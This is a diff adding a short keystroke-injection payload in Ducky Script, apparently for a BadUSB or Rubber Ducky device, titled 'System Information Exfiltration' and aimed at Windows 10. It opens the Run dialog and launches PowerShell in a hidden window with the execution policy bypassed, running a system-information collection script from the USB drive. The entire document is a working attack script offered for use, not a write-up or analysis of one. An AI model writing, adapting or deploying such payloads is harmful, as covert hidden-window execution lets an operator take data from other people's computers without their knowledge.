@@ -1,0 +1,14 @@
+REM	=============================================================================================================
+REM 	Title: System Information Exfiltration
+REM 	Author: Mr.Cricket
+REM 	Description: Collects system information and saves it to USB device
+REM 	Target: Windows 10
+REM 	Category: Information Gathering
+REM	Change the drive letter in line 11 if your USB device uses a different drive (default: D:\)
+REM	==============================================================================================================
+DELAY 5000
+GUI r
+DELAY 200
+STRING powershell -w h -NoP -NonI -ep Bypass D:\collectSystemInfo.ps1
+ENTER
+
